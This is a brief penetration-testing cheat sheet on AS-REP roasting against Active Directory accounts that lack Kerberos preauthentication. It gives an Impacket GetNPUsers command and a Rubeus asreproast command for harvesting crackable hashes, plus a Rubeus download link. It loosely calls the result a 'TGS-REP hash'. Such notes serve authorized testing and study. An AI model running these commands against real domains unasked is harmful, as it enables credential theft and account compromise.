---
title: AS-Rep Roasting
tags:
  - Exploitation
  - Windows
  - Privilege Escalation
---

Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response.

+++ Perform AS-REP Roasting with Impacket
Our Kali machine is not joined to the domain, we also have to provide domain user credentials to obtain the TGS-REP hash.

```bash 
impacket-GetNPUsers -dc-ip $DC_Ip -request -outputfile hashes.asreproast $Domain/$User
```

+++ Perform AS-REP Roasting with Rubeus

You must be in the Domain

```powershell 
.\Rubeus.exe asreproast /nowrap
```

[!file Rubeus](https://github.com/GhostPack/Rubeus/archive/refs/tags/1.6.4.zip)

+++
